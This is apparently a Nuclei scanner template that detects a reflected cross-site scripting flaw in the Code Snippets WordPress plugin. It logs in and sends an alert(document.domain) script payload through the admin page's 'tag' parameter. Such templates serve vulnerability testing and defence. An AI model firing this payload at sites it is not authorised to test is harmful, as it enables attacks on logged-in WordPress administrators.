id: wp-code-snippets-xss
info:
  author: dhiyaneshDK
  description: A reflected Cross-Site Scripting (XSS) vulnerability has been found
    in the Code Snippets WordPress Plugin. By using this vulnerability an attacker
    can inject malicious JavaScript code into the application, which will execute
    within the browser of any logged-in admin who views the link
  name: Code Snippets Wordpress Plugin - Cross-Site Scripting
  reference:
  - https://www.securify.nl/en/advisory/cross-site-scripting-in-code-snippets-wordpress-plugin/
  severity: medium
  tags: wordpress,xss,wp-plugin,authenticated
requests:
- cookie-reuse: true
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
    - toplevel_page_snippets
    - Search results in tag
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/admin.php?page=snippets&tag=</script><script>alert(document.domain)</script>
    HTTP/1.1

    Host: {{Hostname}}

    '
